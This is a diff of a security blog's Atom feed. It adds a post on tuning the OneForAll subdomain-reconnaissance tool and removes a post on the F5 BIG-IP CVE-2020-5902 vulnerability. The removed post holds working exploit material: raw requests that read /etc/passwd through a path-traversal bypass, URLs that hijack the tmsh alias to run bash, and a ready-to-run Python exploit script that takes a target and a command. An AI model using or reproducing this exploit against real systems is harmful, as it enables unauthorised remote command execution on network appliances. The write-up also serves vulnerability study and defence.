@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.svenbeast.com</id>
     <title>攻城肾透shi | sv3nbeast</title>
-    <updated>2021-01-12T07:10:04.862Z</updated>
+    <updated>2021-02-15T04:47:58.362Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.svenbeast.com"/>
     <link rel="self" href="https://www.svenbeast.com/atom.xml"/>
@@ -10,6 +10,49 @@
     <logo>https://www.svenbeast.com/images/avatar.png</logo>
     <icon>https://www.svenbeast.com/favicon.ico</icon>
     <rights>All rights reserved 2021, 攻城肾透shi | sv3nbeast</rights>
+    <entry>
+        <title type="html"><![CDATA[红色消失术☞oneforall的小改动]]></title>
+        <id>https://www.svenbeast.com/post/V-ayqC-IY/</id>
+        <link href="https://www.svenbeast.com/post/V-ayqC-IY/">
+        </link>
+        <updated>2021-02-15T04:38:59.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="先运行起来">先运行起来</h4>
+<p>1.各api，自行用小飞机进行注册好</p>
+<h4 id="解决红色报错">解决红色报错</h4>
+<p>1.yahoo模块报错，代码中获得配置中的代理没生效，遂报错(提了issus)，在yahoo.py的第24行插入</p>
+<figure data-type="image" tabindex="1"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/02/15/81046_image-20210215124209258.png" alt="image-20210215124209258" loading="lazy"></figure>
+<pre><code class="language-Python">self.proxy = self.get_proxy(self.source)
+</code></pre>
+<p>2.github的接口使用的语法有问题，没找到解决办法，遂忽略。没提issus，(-懒</p>
+<figure data-type="image" tabindex="2"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/02/15/45414_image-20210215124224173.png" alt="image-20210215124224173" loading="lazy"></figure>
+<p>3.Fofa的模块等同于不存在，抓了下包，是因为使用的语法需要币，肯定没有，忽略忽略</p>
+<figure data-type="image" tabindex="3"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/02/15/37510_image-20210215124238197.png" alt="image-20210215124238197" loading="lazy"></figure>
+<p>4.google_api的模块，header不需要了，加上key的header头反而会显示认证错误</p>
+<figure data-type="image" tabindex="4"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/02/15/69244_image-20210215124253052.png" alt="image-20210215124253052" loading="lazy"></figure>
+<p>将google_api.py的29行代码注释掉即可</p>
+<p>5.<a href="//114.55.181.28/check_web/databaseInfo_mainSearch.action">114.55.181.28/check_web/databaseInfo_mainSearch.action</a>这个是api升级了，一直没恢复，忽略</p>
+<figure data-type="image" tabindex="5"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/02/15/93186_image-20210215124304233.png" alt="image-20210215124304233" loading="lazy"></figure>
+<h4 id="解决一些超时红色">解决一些超时红色</h4>
+<p>1.oneforall设置的默认超时太短了，大部分网络应该达不到要求，default.py的101行代码斟酌修改一下</p>
+<pre><code class="language-Python">request_timeout_second = (17.05, 27)  # 请求超时秒数(默认connect timout推荐略大于3秒)
+</code></pre>
+<p>2.oneforall里的一些国外网站的模块，虽然国内访问慢，但是能访问，所以默认是即便你设置了代理也并没有对这些模块生效，会大概率超时红色。setting.py的66行我的配置是以下的，全不全不太清楚，因为我关闭了大部分模块，只保留了oneforall独有的模块</p>
+<pre><code class="language-Python">proxy_partial_module = ['GoogleQuery', 'AskSearch', 'DuckDuckGoSearch', 'GoogleAPISearch', 'GoogleSearch', 'YahooSearch',
+                        'YandexSearch', 'CrossDomainXml', 'ContentSecurityPolicy', 'GithubAPISearch', 'HackerTargetQuery', 
+                        'QianXunQuery', 'AskSearch', 'VirusTotalAPIQuery', 'Sublist3rQuery','ArchiveCrawl','CommonCrawl']  # 代理自定义的模块
+</code></pre>
+<p>3.虽然oneforall存在设置所有模块都启用代理的选项，但真设置了也会有问题，没深究。</p>
+<p>4.个人的一些需求—我关闭了oneforall与subfinder重叠的模块，保留了他独有的，是在setting的33行代码设置的，当然32行要写改为False，下面是我筛选出来准备启用的</p>
+<pre><code class="language-Python">enable_partial_module = ['modules.certificates.google','modules.check.axfr','modules.check.cdx','modules.check.cert','modules.check.csp','modules.check.nsec','modules.check.robots','modules.check.sitemap','modules.crawl.archivecrawl','modules.crawl.commoncrawl','modules.datasets.chinaz_api','modules.datasets.chinaz','modules.datasets.cloudflare_api','modules.datasets.ip138','modules.datasets.netcraft','modules.datasets.qianxun','modules.datasets.wzpc','modules.dnsquery.mx','modules.dnsquery.ns','modules.dnsquery.soa','modules.dnsquery.spf','modules.dnsquery.txt','modules.intelligence.riskiq_api','modules.search.ask','modules.search.baidu','modules.search.ask','modules.search.bing','modules.search.gitee','modules.search.google_api','modules.search.google','modules.search.so','modules.search.sogou','modules.search.yahoo','modules.search.yandex']  # 启用部分收集模块 必须禁用enable_all_module才能生效
+
+</code></pre>
+<p>5.同时我也关闭了爆破选项，准备用ksubdomain跑。。</p>
+<ul>
+<li>效果图:<br>
+<img src="https://www.svenbeast.com/post-images/1613364402044.gif" alt="" loading="lazy"></li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[【教科书】Shiro反序列化利用分析及其他一些有趣的知识]]></title>
         <id>https://www.svenbeast.com/post/jiao-ke-shu-shiro-fan-xu-lie-hua-li-yong-fen-xi-ji-qi-ta-yi-xie-you-qu-de-zhi-shi/</id>
@@ -1849,166 +1892,6 @@ int main()
 </ul>
 <pre><code>可能会有人感觉写得啰嗦~ 其实是因为本人也是自己学习，都是摸索着来，所以对一些 &quot;坑&quot; 的基础小问题很敏感，因为在完全不会的情况下遇到其实都还蛮懵的，同样问题对不同的人来说难度确实是不一样的，所以，我还是赶紧衮去继续学习吧
 </code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CVE-2020-5902 BIG-IP RCE  绕过tmsh限制命令执行&EXP编写]]></title>
-        <id>https://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/</id>
-        <link href="https://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/">
-        </link>
-        <updated>2020-07-06T02:58:25.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
-<p>最近 F5 Networks的网络和安全产品BIG IP应用交付控制器曝出漏洞，昨天晚上10点时有人在推特发布了POC，随即尝试跟进此漏洞并编写EXP。</p>
-<h3 id="0x02-poc">0x02 POC</h3>
-<p>twitter: https://twitter.com/x4ce/status/1279790599793545216</p>
-<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1594021257299.png" alt="" loading="lazy"></figure>
-<ul>
-<li>Read File Example:</li>
-</ul>
-<pre><code>/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
-
-GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1
-Host: 127.0.0.1
-Connection: close
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Sec-Fetch-Site: none
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8
-Cookie: JSESSIONID=89E562018185E75966F67E7FC50CF6E1
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1594020786088.png" alt="" loading="lazy"></figure>
-<ul>
-<li>F5 RCE Example:</li>
-</ul>
-<pre><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user
-
-GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user HTTP/1.1
-Host: 127.0.0.1
-Connection: close
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Sec-Fetch-Site: none
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8
-Cookie: JSESSIONID=07E7975B5F6F4B43F3375AA5FFB32628
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1594020882774.png" alt="" loading="lazy"></figure>
-<h3 id="0x03-尝试执行命令">0x03 尝试执行命令</h3>
-<p>此处思路是利用alias绕过tmsh限制，学习自<a href="https://github.com/rapid7/metasploit-framework/pull/13807/commits">msf脚本</a>，目前还未合并到msf中</p>
-<ul>
-<li>
-<ol>
-<li>修改alias ，将list设置成bash命令</li>
-</ol>
-</li>
-</ul>
-<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
-</code></pre>
-<ul>
-<li>
-<ol start="2">
-<li>生成bash文件并写入要执行的命令</li>
-</ol>
-</li>
-</ul>
-<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe&amp;content=whoami
-</code></pre>
-<ul>
-<li>
-<ol start="3">
-<li>执行bash文件</li>
-</ol>
-</li>
-</ul>
-<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe
-</code></pre>
-<ul>
-<li>
-<ol start="4">
-<li>还原alias设置，防止影响目标正常使用</li>
-</ol>
-</li>
-</ul>
-<pre><code>https://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list
-</code></pre>
-<p>Example:</p>
-<p>这是命令成功执行后的回显，此处执行的是whoami命令<br>
-<img src="https://www.svenbeast.com/post-images/1594020895508.png" alt="" loading="lazy"></p>
-<h3 id="0x04-exp">0x04 EXP</h3>
-<ul>
-<li>编写一个exp脚本以便以后碰到后节省时间</li>
-<li>Github: https://github.com/sv3nbeast/CVE-2020-5902_RCE</li>
-</ul>
-<figure data-type="image" tabindex="4"><img src="https://www.svenbeast.com/post-images/1594026785249.png" alt="" loading="lazy"></figure>
-<pre><code>import requests   #by 斯文
-import sys
-import json
-requests.packages.urllib3.disable_warnings()
-
-banner= '''
-   ______     _______     ____   ___ ____   ___       ____  ___   ___ ____  
-  / ___\ \   / / ____|   |___ \ / _ \___ \ / _ \     | ___|/ _ \ / _ \___ \ 
- | |    \ \ / /|  _| _____ __) | | | |__) | | | |____|___ \ (_) | | | |__) |
- | |___  \ V / | |__|_____/ __/| |_| / __/| |_| |_____|__) \__, | |_| / __/ 
-  \____|  \_/  |_____|   |_____|\___/_____|\___/     |____/  /_/ \___/_____|          
-
-                                                        by 斯文
-'''
-
-headers = {
-    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
-}
-
-def check(url, cmd):
-    try:
-        print('[+ 开始测试目标: {}  命令: {}'.format(url,cmd))
-
-        del_alias = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
-        creat_alias = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
-        write_bash = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe&amp;content={}'.format(cmd)
-        exec_bash = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe'
-        print('[+ 正在还原alias设置，防止其他人未修改回来')
-        x = requests.get(del_alias,headers=headers,verify=False,timeout=30)
-        print('[+ 正在将list命令劫持为bash')
-        y = requests.get(creat_alias,headers=headers,verify=False,timeout=30)
-        print('[+ 正在写入bash文件')
-        z = requests.get(write_bash,headers=headers,verify=False,timeout=30)
-        print('[+ 正在执行命令,请查看output字段值'+'\n')
-        g = requests.get(exec_bash,headers=headers,verify=False,timeout=30)
-        requests.get(del_alias,headers=headers,verify=False,timeout=30)
-        text = g.content.decode('utf-8')
-        print(text.strip('\n'))
-    except:
-        print('[- 请查看目标是否可以正常访问')
-if __name__ == &quot;__main__&quot;:
-    try:
-        url = sys.argv[1]
-        cmd = sys.argv[2]
-        if url[-1] == '/':url=url[0:-1]
-        print(banner)
-        check(url=url,cmd=cmd)
-
-    except Exception as e:
-        # print(e)
-        
-        print('python3 CVE-2020-5902.py http://x.x.x.x  whoami')
-</code></pre>
-<h3 id="0x05-坑点">0x05 坑点</h3>
-<ul>
-<li>在执行前可尝试先还原一遍alias的设置，防止list命令已被篡改</li>
-<li>文件读取和RCE是两个单独的漏洞，不是说存在文件读取就会存在RCE，两者影响版本不同</li>
-</ul>
 ]]></content>
     </entry>
 </feed>
